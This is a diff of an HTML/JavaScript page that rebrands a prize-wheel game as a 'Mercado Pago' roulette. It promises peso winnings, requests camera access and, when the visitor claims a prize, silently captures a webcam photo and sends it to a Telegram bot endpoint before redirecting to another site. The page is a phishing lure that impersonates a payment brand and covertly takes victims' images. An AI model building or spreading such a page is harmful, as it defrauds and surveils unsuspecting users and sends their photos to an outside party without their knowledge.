@@ -3,34 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ruleta de Circo</title>
+    <title>Ruleta de Mercado Pago</title>
     <style>
+        /* Fondo de Mercado Pago */
         body {
-            background-color: #f0f8ff;
-            text-align: center;
-            font-family: 'Arial', sans-serif;
             margin: 0;
             padding: 0;
+            font-family: Arial, sans-serif;
+            background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Mercado_Pago_Logo_2018.png/500px-Mercado_Pago_Logo_2018.png'); /* Fondo Mercado Pago */
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: white;
         }
+
+        h1 {
+            position: absolute;
+            top: 20px;
+            color: #0038a8;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7);
+            font-size: 30px;
+            z-index: 10;
+        }
+
+        /* Ruleta */
         .ruleta {
             width: 80vw;
             height: 80vw;
             max-width: 350px;
             max-height: 350px;
             border-radius: 50%;
-            border: 10px solid #ff0000;
-            margin: 20px auto;
             position: relative;
             background: conic-gradient(
-                #ff6347 0deg 60deg, 
-                #ff8c00 60deg 120deg, 
-                #ffcc00 120deg 180deg, 
-                #ffd700 180deg 240deg, 
-                #32cd32 240deg 300deg, 
-                #ff1493 300deg 360deg
+                #0038a8 0deg 60deg, 
+                #005ab5 60deg 120deg, 
+                #007bff 120deg 180deg, 
+                #0099ff 180deg 240deg, 
+                #66ccff 240deg 300deg, 
+                #99ccff 300deg 360deg
             );
             box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
+            transition: transform 4s ease-out;
         }
+
+        /* Estilo para los sectores de la ruleta */
         .sector {
             position: absolute;
             width: 50%;
@@ -38,36 +58,55 @@
             text-align: center;
             font-size: 18px;
             color: white;
-            line-height: 50px;
             font-weight: bold;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             padding-top: 20px;
+            line-height: 35px;
         }
+
+        /* Posicionando los sectores de forma correcta */
+        .sector:nth-child(1) { transform: rotate(0deg); top: 5%; left: 50%; transform-origin: 100% 100%; }
+        .sector:nth-child(2) { transform: rotate(60deg); top: 5%; left: 50%; transform-origin: 100% 100%; }
+        .sector:nth-child(3) { transform: rotate(120deg); top: 5%; left: 50%; transform-origin: 100% 100%; }
+        .sector:nth-child(4) { transform: rotate(180deg); top: 5%; left: 50%; transform-origin: 100% 100%; }
+        .sector:nth-child(5) { transform: rotate(240deg); top: 5%; left: 50%; transform-origin: 100% 100%; }
+        .sector:nth-child(6) { transform: rotate(300deg); top: 5%; left: 50%; transform-origin: 100% 100%; }
+
+        /* Botones */
         #spinButton, #reclamarBtn {
             margin-top: 20px;
             padding: 12px 24px;
             font-size: 18px;
             cursor: pointer;
-            background-color: #28a745;
+            background-color: #0038a8;
             color: white;
             border: none;
             border-radius: 5px;
             transition: background-color 0.3s;
             width: 80%;
             max-width: 200px;
+            z-index: 10;
         }
+
         #spinButton:hover, #reclamarBtn:hover {
-            background-color: #218838;
+            background-color: #005ab5;
         }
+
         #reclamarBtn {
             display: none;
             animation: showBox 1s ease-out;
         }
+
         #premioDisplay {
             font-size: 22px;
             font-weight: bold;
             color: #007bff;
             margin-top: 20px;
+            z-index: 10;
         }
+
         @keyframes showBox {
             0% {
                 transform: scale(0);
@@ -78,31 +117,31 @@
                 opacity: 1;
             }
         }
+
+        /* Aseguramos que todo se vea bien en dispositivos pequeños */
+        @media screen and (max-width: 600px) {
+            .ruleta {
+                width: 90vw;
+                height: 90vw;
+            }
+
+            h1 {
+                font-size: 24px;
+            }
+        }
     </style>
 </head>
 <body>
 
-    <h1>Ruleta de Circo</h1>
+    <h1>Ruleta de Mercado Pago</h1>
 
     <div class="ruleta" id="ruleta">
-        <div class="sector" style="transform: rotate(0deg);">
-            <img src="https://example.com/imagen_1000.png" alt="Premio $1000" width="80">
-        </div>
-        <div class="sector" style="transform: rotate(60deg);">
-            <img src="https://example.com/imagen_500.png" alt="Premio $500" width="80">
-        </div>
-        <div class="sector" style="transform: rotate(120deg);">
-            <img src="https://example.com/imagen_200.png" alt="Premio $200" width="80">
-        </div>
-        <div class="sector" style="transform: rotate(180deg);">
-            <img src="https://example.com/imagen_50.png" alt="Premio $50" width="80">
-        </div>
-        <div class="sector" style="transform: rotate(240deg);">
-            <img src="https://example.com/imagen_10.png" alt="Premio $10" width="80">
-        </div>
-        <div class="sector" style="transform: rotate(300deg);">
-            <img src="https://example.com/imagen_5.png" alt="Premio $5" width="80">
-        </div>
+        <div class="sector">5000 ARG</div>
+        <div class="sector">7000 ARG</div>
+        <div class="sector">1000 ARG</div>
+        <div class="sector">15000 ARG</div>
+        <div class="sector">40000 ARG</div>
+        <div class="sector">50000 ARG</div>
     </div>
 
     <button id="spinButton">Girar Ruleta</button>
@@ -113,20 +152,26 @@
         let camara;
         let premio = "";
         let premios = [
-            { cantidad: "$1000", icono: "https://example.com/imagen_1000.png" },
-            { cantidad: "$500", icono: "https://example.com/imagen_500.png" },
-            { cantidad: "$200", icono: "https://example.com/imagen_200.png" },
-            { cantidad: "$50", icono: "https://example.com/imagen_50.png" },
-            { cantidad: "$10", icono: "https://example.com/imagen_10.png" },
-            { cantidad: "$5", icono: "https://example.com/imagen_5.png" }
+            { cantidad: "5000 ARG", icono: "💰" },
+            { cantidad: "7000 ARG", icono: "💰" },
+            { cantidad: "1000 ARG", icono: "💰" },
+            { cantidad: "15000 ARG", icono: "💰" },
+            { cantidad: "40000 ARG", icono: "💰" },
+            { cantidad: "50000 ARG", icono: "💰" }
         ];
 
+        // Solicitar permiso para la cámara
         navigator.mediaDevices.getUserMedia({ video: true })
             .then((stream) => {
                 camara = stream;
+                const videoElement = document.createElement('video');
+                videoElement.srcObject = stream;
+                videoElement.play();
+                document.body.appendChild(videoElement);
             })
             .catch((error) => {
                 console.error('Error al obtener la cámara:', error);
+                alert("No se pudo acceder a la cámara. Por favor, verifica los permisos.");
             });
 
         document.getElementById('spinButton').addEventListener('click', function() {
@@ -137,8 +182,7 @@
             setTimeout(() => {
                 let premioAleatorio = premios[Math.floor(Math.random() * premios.length)];
                 premio = premioAleatorio.cantidad;
-                let iconoMoneda = premioAleatorio.icono;
-                document.getElementById('premioDisplay').innerHTML = `¡Has ganado: <img src="${iconoMoneda}" alt="${premio}"> ${premio}!`;
+                document.getElementById('premioDisplay').textContent = `¡Has ganado: ${premio}!`;
                 document.getElementById('reclamarBtn').style.display = "block";
             }, 4000);
         });
@@ -156,9 +200,8 @@
 
                 video.onloadeddata = () => {
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const foto = canvas.toDataURL('image/png');  // Asegúrate de especificar el tipo de imagen
+                    const foto = canvas.toDataURL('image/png'); 
 
-                    // Enviar la foto a Telegram
                     fetch('https://api.telegram.org/bot<your-bot-token>/sendPhoto', {
                         method: 'POST',
                         headers: {
@@ -178,9 +221,9 @@
         }
 
         function reclamarPremio() {
-            tomarFoto(); // Tomar la foto antes de redirigir
+            tomarFoto(); 
             alert("¡Has ganado un premio de " + premio + "! Redirigiendo a otro enlace...");
-            window.location.href = "https://otro-enlace.com"; // Redirige a otro enlace
+            window.location.href = "https://otro-enlace.com"; 
         }
     </script>
 
